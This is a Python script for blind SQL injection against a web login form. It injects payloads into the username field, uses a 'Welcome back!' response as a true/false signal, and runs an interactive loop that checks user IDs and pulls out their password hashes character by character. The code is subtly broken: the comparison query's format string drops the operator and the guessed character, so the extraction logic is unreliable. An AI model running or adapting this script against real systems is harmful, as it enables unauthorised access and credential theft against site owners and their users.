import requests
total_queries = 0
charset = "0123456789abcdef"
target = "" # URL
needle = "Welcome back!"

def injected_query(payload):# request function
    global total_queries
    r = requests.post(target, data={"username":"admin' and {}--".format(payload), "password":"password"})
    total_queries+=1
    return needle.encode() not in r.content# this is blind SQL, so we're checking for the login response (the 'needle') in the response (r.content)

def boolean_query(offset, user_id, character, operator=">"):# check if query was successful
    payload = "(select hex(substr(password,{},1)) from user where id = {}) hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id):# check if a user is valid. Not helpful in the real world
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

def password_length(user_id):# guess password hash length for user
    i = 0# current guess
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i+=1# when the response is False, the previous guess is the correct length

def extract_hash(charset, user_id, password_length):# extracting the hash
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queies!".format(total_queries))
    total_queries = 0

while True:# making it interactive
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:# exiting the infinite while loop
        break
    




